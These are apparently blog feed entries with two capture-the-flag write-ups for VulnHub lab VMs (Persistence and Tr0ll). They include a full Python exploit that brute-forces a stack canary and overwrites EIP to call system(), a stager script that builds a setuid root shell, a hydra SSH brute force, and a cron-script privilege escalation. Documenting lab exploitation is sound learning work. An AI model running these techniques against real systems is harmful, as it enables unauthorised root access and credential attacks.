<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>

<p>I tried to put a command in a env variable and failed.<br/>
I attempted to write a ROP chain and failed.</p>

<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>

<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>

<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>

<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>

<p>```bash wopr strings
root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
<strong>gmon_start</strong>
libc.so.6
_IO_stdin_used</p>

<p>[.. snip ..]</p>

<p>[^_]
[+] yeah, I don&rsquo;t think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log          # &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
```</p>

<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>

<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>

<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>

<p>```bash finding /tmp/log
root@kali:~# gdb -q ./wopr
Reading symbols from wopr&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ b *main
Breakpoint 1 at 0x80487de</p>

<p>gdb-peda$ r
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 &mdash;> 0x0
ESP: 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;<strong>libc_start_main+230>:    mov    DWORD PTR [esp],eax)
EIP: 0x80487de (<main>: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
   0x80487d7 &lt;get_reply+99>:    call   0x804865c &lt;</strong>stack_chk_fail@plt>
   0x80487dc &lt;get_reply+104>:   leave<br/>
   0x80487dd &lt;get_reply+105>:   ret  <br/>
=> 0x80487de <main>:    push   ebp
   0x80487df &lt;main+1>:  mov    ebp,esp
   0x80487e1 &lt;main+3>:  sub    esp,0x258
   0x80487e7 &lt;main+9>:  mov    eax,DWORD PTR [ebp+0x8]
   0x80487ea &lt;main+12>: mov    DWORD PTR [ebp-0x23c],eax
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3fc &mdash;> 0xb7e8ae36 (&lt;__libc_start_main+230>:   mov    DWORD PTR [esp],eax)
0004| 0xbffff400 &mdash;> 0x1
0008| 0xbffff404 &mdash;> 0xbffff4a4 &mdash;> 0xbffff60a (&ldquo;wopr&rdquo;)
0012| 0xbffff408 &mdash;> 0xbffff4ac &mdash;> 0xbffff629 (&ldquo;SSH_AGENT_PID=3171&rdquo;)
0016| 0xbffff40c &mdash;> 0xb7fe08d8 &mdash;> 0xb7e74000 &mdash;> 0x464c457f
0020| 0xbffff410 &mdash;> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0024| 0xbffff414 &mdash;> 0xffffffff
0028| 0xbffff418 &mdash;> 0xb7ffeff4 &mdash;> 0x1cf2c
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main ()</p>

<p>gdb-peda$ searchmem /tmp/log
Searching for &lsquo;/tmp/log&rsquo; in: None ranges
Found 2 results, display max 2 items:
wopr : 0x8048c60 (&ldquo;/tmp/log&rdquo;)
wopr : 0x8049c60 (&ldquo;/tmp/log&rdquo;)
```</p>

<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>

<h2>wopr &ndash; the exploit</h2>

<p>To sum up what we have to do to exploit this, we can say that we have to:</p>

<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>


<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>

<p><code>text
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +
"\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"
</code></p>

<p>I finished up coding the exploit, which eventually resulted in the following:</p>

<p>```python Persistence Sploit
import socket
import sys
import os</p>

<p>payload = &ldquo;A&rdquo; * 30  # amount of bytes to before the canary is hit
canary = &ldquo;&rdquo;     # canary that should update as its bruted</p>

<p>print &ldquo;&rdquo;"</p>

<pre><code>        A: "So, I heard you like pain...?"
        B: "... a bit"
        C: "Well, here it is, the: "
</code></pre>

<hr />

<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>

<pre><code>  _____ ____  _       ___  ____  ______ 
 / ___/|    \| |     /   \|    ||      |
(   \_ |  o  ) |    |     ||  | |      |
 \__  ||   _/| |___ |  O  ||  | |_|  |_|
 /  \ ||  |  |     ||     ||  |   |  |  
 \    ||  |  |     ||     ||  |   |  |  
  \___||__|  |_____| \___/|____|  |__|  

            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
            A: "I also have no idea what I am doing"
</code></pre>

<p>&ldquo;&rdquo;"</p>

<p>print &ldquo;[+] Connecting &amp; starting canary brute force&hellip;&rdquo;</p>

<h1>start the canary brute loop. We want to brute 4 bytes &hellip;</h1>

<p>for x in xrange(1,5):</p>

<pre><code># ... and try all possibilities
for canary_byte in xrange(0, 256):

    # prepare the byte
    hex_byte = chr(canary_byte)

    # prepare the payload
    send = payload + canary + hex_byte

    # connect and send payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('127.0.0.1', 3333))

    # get the inital banners
    sock.recv(35)   # [+] hello, my name is sploitable\n
    sock.recv(40)   # [+] would you like to play a game?\n 
    sock.recv(5)    # &gt; 

    # send the payload  
    sock.send(send)
    sock.recv(27)   # [+] yeah, I don't think so\n

    # if we have a OK response, then we will have this last part
    # as '[+] bye!\n' populated, if its wrong, not
    data =  sock.recv(64)   # [+] bye!\n
    if "bye" in data:
        print "[+] Found a possible canary value of '{0}'!".format(hex_byte.encode("hex"))
        canary += hex_byte
        sock.close()
        break

    sock.close()
# if we cant even find the first byte, we failed already
if len(canary) &lt;= 0:
    print "[-] Unable to even find the first bit of the canary. No luck"
    sys.exit(0)
</code></pre>

<h1>The canary is our ticket out of here!</h1>

<p>if len(canary) == 4:</p>

<pre><code>print "[+] Canary known as : {0}".format(canary.encode("hex"))
print "[+] Writing /tmp/log to be called by wopr later"

# ./wopr has the string /tmp/log in it. We will use this as
# our code exec point, overwriting whatever is in it atm
stager = """
    #!/bin/sh

    # First, prepare a small C shell and move it to /tmp with name getroot
    echo "int main(void)\n{\nsetuid(0);\nsystem(\\"/bin/sh\\");\nreturn 0;\n}" &gt; /tmp/getroot.c

    # compile it
    /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot

    # change ownership and setuid
    /bin/chown root:root /tmp/getroot
    /bin/chmod 4777 /tmp/getroot
"""

# write the file
with open('/tmp/log','w') as stager_file:
    stager_file.write(stager)

# make it executable
os.chmod('/tmp/log', 0755)

# now, with the stack canary known and the stager ready, lets corrupt
# EIP and sploit!
payload += canary               # canary we bruted
payload += "A" * 4              # padding to EIP wich is at byte 42
payload += "\x10\x62\xe5\xb7"   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
payload += "JUNK"               # JUNK. Should probably do exit() here. Meh.
payload += "\x60\x8c\x04\x08"   # location if /tmp/log string in .data

# and connect &amp;&amp; send
print "[+] Connecting to service"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 3333))
sock.recv(35)
sock.recv(40)
sock.recv(5)
print "[+] Sending Payload"
sock.send(payload)

sock.recv(64)
sock.close()
print "[+] Done"

print "[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)"
os.system("/tmp/getroot")
</code></pre>

<p>else:</p>

<pre><code>print "[!] Incomplete Canary. Can't continue reliably"
</code></pre>

<h1>done</h1>

<p>```</p>

<p>A sample run would be:</p>

<p>```bash Running sploit.py
bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r&mdash;. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py</p>

<pre><code>        A: "So, I heard you like pain...?"
        B: "... a bit"
        C: "Well, here it is, the: "
</code></pre>

<hr />

<p>|    \ /  <em>]|    \  / </em><strong>/|    / </strong><em>/|      |  /  </em>]|    \   /  ]  /  <em>]
|  o  )  [</em> |  D  )(   _  |  (   _ |      | /  [<em> |  _  | /  /  /  [</em>
|   <em>/    </em>]|    /  _<em>  | |  |_</em>  ||<em>|  |</em>||    <em>]|  |  |/  /  |    </em>]
|  | |   [<em> |    \  /  \ | |  |/  \ |  |  |  |   [</em> |  |  /   _ |   [<em>
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|<strong>| |</strong></em><strong>||</strong>|_|  _<strong>||</strong><strong>|_</strong>|  |<strong>|  |</strong><em><strong>||</strong>|<strong>|_</strong></em>||_____|</p>

<pre><code>  _____ ____  _       ___  ____  ______ 
 / ___/|    \| |     /   \|    ||      |
(   \_ |  o  ) |    |     ||  | |      |
 \__  ||   _/| |___ |  O  ||  | |_|  |_|
 /  \ ||  |  |     ||     ||  |   |  |  
 \    ||  |  |     ||     ||  |   |  |  
  \___||__|  |_____| \___/|____|  |__|  

            A: "AKA: FU superkojiman &amp;&amp; sagi- !!"
            A: "I also have no idea what I am doing"
</code></pre>

<p>[+] Connecting &amp; starting canary bruteforce&hellip;
[+] Found a possible canary value of &lsquo;64&rsquo;!
[+] Found a possible canary value of &lsquo;d3&rsquo;!
[+] Found a possible canary value of &lsquo;c6&rsquo;!
[+] Found a possible canary value of &lsquo;15&rsquo;!
[+] Canary known as : 64d3c615
[+] Writing /tmp/log to be called by wopr later
[+] Connecting to service
[+] Sending Payload
[+] Done
[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
sh-4.1# id
uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```</p>

<p>And, as proof, we cat the flag!</p>

<p>```bash Persistence w00t
sh-4.1# cat /root/flag.txt</p>

<pre><code>          .d8888b.  .d8888b. 888    
         d88P  Y88bd88P  Y88b888    
         888    888888    888888    
</code></pre>

<p>888  888  888888    888888    888888888
888  888  888888    888888    888888  <br/>
888  888  888888    888888    888888  <br/>
Y88b 888 d88PY88b  d88PY88b  d88PY88b.<br/>
 &ldquo;Y8888888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y8888P&rdquo;  &ldquo;Y888</p>

<p>Congratulations!!! You have the flag!</p>

<p>We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.</p>

<p>Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!</p>

<p>Until next time,</p>

<pre><code>  sagi- &amp; superkojiman
</code></pre>

<p>```</p>

<h2>conclusion</h2>

<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>

<h2>thats not all</h2>

<p>There are however a few more things I&rsquo;d like to try.</p>

<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[taming (actually just solving) the troll]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/15/taming-the-troll/"/>
    <updated>2014-08-15T07:12:03+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/15/taming-the-troll</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Having recently started the road to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">OSCP</a>, <a href="https://twitter.com/Maleus21">@Maleus21</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> on <a href="https://twitter.com/VulnHub">@VulnHub</a>. I figured since the description was <em>Difficulty: Beginner ; Type: boot2root</em>, I could give it a smash in a evening as a bit of distraction.</p>

<h2>nomad, promise</h2>

<p>As usual, I downloaded the VM, extracted the <code>.rar</code> and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:</p>

<p>```bash Tr0ll nmap
root@kali:~# nmap -v &mdash;reason -sV 192.168.56.101 -p-</p>

<p>PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
```</p>

<p>So, <code>ssh</code>, <code>ftp</code>, and <code>http</code>. Naturally my first reaction was to inspect the web service.</p>

<p><img class="<a" src="href="https://i.imgur.com/SiNzlyi.png">https://i.imgur.com/SiNzlyi.png</a>"></p>

<p>The <code>robots.txt</code> file revealed:</p>

<p><code>text Tr0ll robots.txt
User-agent:*
Disallow: /secret
</code></p>

<p>Browsing to <code>/secret</code> revealed yet another <em>interesting</em> piece of art:</p>

<p><img class="<a" src="href="https://i.imgur.com/E2SezsL.png">https://i.imgur.com/E2SezsL.png</a>"></p>

<p>Right&hellip; A little early to be &lsquo;mad&rsquo;, but nonetheless, lets move on.</p>

<h2>anonny-mouse ftp</h2>

<p>A quick and lazy google for <code>vsftpd 3.0.2 exploit</code> didn&rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:</p>

<p>```bash Tr0ll ftp login
root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.</p>

<p>ftp> ls
500 Illegal PORT command.
<a href="ftp:">ftp:</a> bind: Address already in use</p>

<p>ftp> passive
Passive mode on.</p>

<p>ftp> ls
227 Entering Passive Mode (192,168,56,101,231,190)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
226 Directory send OK.</p>

<p>ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
227 Entering Passive Mode (192,168,56,101,189,113)
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (21294.3 kB/s)</p>

<p>ftp> bye
221 Goodbye.
```</p>

<p>Well that worked, and showed that we have a file <code>lol.pcap</code> to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called <code>secret_stuff.txt</code> that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:</p>

<p><img class="<a" src="href="https://i.imgur.com/vpgEP3o.png">https://i.imgur.com/vpgEP3o.png</a>"></p>

<p>Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to <a href="http://192.168.56.101/sup3rs3cr3tdirlol/.">http://192.168.56.101/sup3rs3cr3tdirlol/.</a> In this path there was a binary  called <code>roflmao</code>. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:</p>

<p><code>``bash Tr0ll roflmao file
root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to:</code>roflmao'</p>

<p>100%[======>] 7,296       &mdash;.-K/s   in 0s</p>

<p>2014-08-15 07:57:56 (826 MB/s) &ndash; `roflmao' saved [7296/7296]</p>

<p>root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
```</p>

<p>Nice. <code>0x0856BF</code> is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with <a href="https://twitter.com/barrebas">@barrebas</a> on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried <a href="http://192.168.56.101/0x0856BF/:">http://192.168.56.101/0x0856BF/:</a></p>

<p><img class="<a" src="href="https://i.imgur.com/yXWgKij.png">https://i.imgur.com/yXWgKij.png</a>"></p>

<h2>nohydraplz</h2>

<p>Cool! At this stage I was pretty sure there was not much left to gain shell. The folder <code>good_luck</code> had a file called <code>which_one_lol.txt</code> with contents:</p>

<p><code>text which_one_lol.txt
maleus
ps-aux
felux
Eagle11
genphlux &lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
</code></p>

<p>List of passwords? Dunno. The folder <code>this_folder_contains_the_password</code> had a file <code>Pass.txt</code> with contents:</p>

<p><code>text Pass.txt
Good_job_:)
</code></p>

<p>At this stage I figured this had to be either a nicely provided wordlist for some <code>hydra</code> action on the <code>ftp</code> || <code>ssh</code> service. So naturally, I copied the information to a file called <code>list.txt</code> (also made a copy of the <code>genphlux</code> word so that its on its own line), and fired up hydra on <code>ssh</code>:</p>

<p>```bash Tr0ll hydra
root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>

<p>[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses &hellip; done
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;maleus&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 1 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;ps-aux&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 2 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;felux&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 3 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;Eagle11&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 4 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;genphlux &lt; &mdash; Definitely not this one&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 5 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;genphlux&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 6 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;usmc8892&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 7 of 169 [child 0]</p>

<p>[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;usmc8892&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 7 of 169 [child 0]</p>

<p>[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;usmc8892&rdquo; &ndash; pass &ldquo;maleus&rdquo; &ndash; 7 of 169 [child 0]
```</p>

<p>Err, the sudden errors only meant one thing&hellip; <code>fail2ban</code>.</p>

<p>```bash Tr0ll ssh filtered
root@kali:~# nmap -v &mdash;reason -Pn 192.168.56.101 -p 22</p>

<p>PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response</p>

<p>```</p>

<p>So, this was the first part that frustrated me and had me going <em>&ldquo;seriously&hellip; :\&rdquo;</em>. Maybe this was actually a list of <code>ftp</code> creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.</p>

<h2>first shell</h2>

<p>I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&rsquo;s <code>thing</code>. Eventually, it was apparent that none of these words as a username/password combination was the correct one.</p>

<p>Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to <em>read</em> everything), that the password may be in this folder (<code>this_folder_contains_the_password</code>). Get it, the <code>Pass.txt</code> is the password&hellip;</p>

<p>Right, so I changed <code>hydra</code> slightly to use <code>Pass.txt</code> as a password and continued to brute with the original <code>list.txt</code> as usernames:</p>

<p><code>``bash Tr0ll hydra success</code>
root@kali:~# hydra -v -V -u -L list -p &ldquo;Pass.txt&rdquo; -t 1 -u 192.168.56.101 ssh
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>

<p>[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses &hellip; done
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;maleus&rdquo; &ndash; pass &ldquo;Pass.txt&rdquo; &ndash; 1 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;ps-aux&rdquo; &ndash; pass &ldquo;Pass.txt&rdquo; &ndash; 2 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;felux&rdquo; &ndash; pass &ldquo;Pass.txt&rdquo; &ndash; 3 of 13 [child 0]
[&hellip;]
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
```</p>

<p>Yay <code>overflow:Pass.txt</code> should get us a session via ssh:</p>

<p>```bash Tr0ll ssh
root@kali:~/Desktop/Tr0ll# ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#111;&#118;&#101;&#x72;&#102;&#108;&#x6f;&#x77;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#53;&#x36;&#x2e;&#49;&#x30;&#x31;">&#x6f;&#118;&#x65;&#x72;&#x66;&#x6c;&#111;&#119;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#53;&#x36;&#46;&#x31;&#x30;&#49;</a>
<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#111;&#x76;&#x65;&#x72;&#x66;&#x6c;&#111;&#x77;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#x31;&#48;&#49;">&#x6f;&#x76;&#x65;&#x72;&#x66;&#x6c;&#x6f;&#x77;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x35;&#54;&#x2e;&#x31;&#48;&#x31;</a>&rsquo;s password:
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)</p>

<p>[&hellip;]</p>

<p>Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```</p>

<h2>&hellip; and root</h2>

<p>And so it was time for classic enumeration again. The first <em>strange</em> thing was the fact that it appeared as if all the <code>/home</code> directories apart from <code>/home/troll</code> was deleted. Weird. Other than that, there were a whole bunch of users according to <code>/etc/passwd</code>, and I can&rsquo;t run anything as <code>root</code> via <code>sudo</code>.</p>

<p>There was a file in <code>/opt/</code> called <code>lmao.py</code>, however I did not have access to read it. Soooo, more enumeration.</p>

<p><em>suddenly</em></p>

<p>```bash Tr0ll times up
Broadcast Message from root@trol</p>

<pre><code>    (somewhere) at 16:05 ...                                               
</code></pre>

<p>TIMES UP LOL!</p>

<p>Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
```</p>

<p>Urgh. Turns out, something is killing my ssh session every 5 minutes. <strong>Oh my word</strong>, was that annoying. I could handle everything the VM&rsquo;s offered, but this was probably the worst part of it.</p>

<p>Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the <em>thing</em> I should be finding has a more recent timestamp:</p>

<p>```bash Tr0ll check
overflow@troll:/$ find / -executable -type f 2> /dev/null | egrep -v &ldquo;^/bin|^/var|^/etc|^/usr&rdquo; | xargs ls -lh | grep Aug</p>

<p>-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
-rwx&mdash;x&mdash;x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
```</p>

<p>A few interesting results came from that, however, the one that held the golden nugget was <code>/lib/log/cleaner.py</code>. During my enumeration I noticed that <code>/tmp</code> got cleaned out at a really strange time as I was still trying to <code>less</code> a file in there, however, it just <em>disappeared</em>.</p>

<p>Anyways, as <code>cleaner.py</code> was owned by root and running <code>os.system</code>, I just modified it to prepare me a classic <code>getroot</code> binary:</p>

<p>```python cleaner.py</p>

<h1>!/usr/bin/env python</h1>

<p>import os
import sys
try:</p>

<pre><code>os.system('chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot ')
</code></pre>

<p>except:</p>

<pre><code>sys.exit()
</code></pre>

<p>```</p>

<p>I waited for that annoying &lsquo;Times UP&rsquo; message, and inspected <code>/var/tmp</code>:</p>

<p>```bash rooted
overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
-rw-rw-r&mdash;  1 overflow overflow   71 Aug 14 13:09 sh.c</p>

<p>overflow@troll:/$ /var/tmp/getroot
#</p>

<h1>id</h1>

<p>uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)</p>

<h1>ls /root</h1>

<p>proof.txt</p>

<h1>cat /root/proof.txt</h1>

<p>Good job, you did it!</p>

<p>702a8c18d29c6f3ca0d99ef5712bfbdc
#
```</p>

<h2>for the curious</h2>

<p>That really annoying session that keeps dying? Turns out its <code>/opt/lmao.py</code> to blame:</p>

<p>```python grr</p>

<h1>cat /opt/lmao.py</h1>

<h1>!/usr/bin/env python</h1>

<p>import os</p>

<p>os.system(&lsquo;echo &ldquo;TIMES UP LOL!&rdquo;|wall&rsquo;)
os.system(&ldquo;pkill -u &lsquo;overflow&rsquo;&rdquo;)
sys.exit()</p>

<h1></h1>

<p>```</p>

<p>Thanks <a href="https://twitter.com/maleus21">@maleus21</a> for the VM!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Beating Xerxes 2 (no, not the Persian King)]]></title>
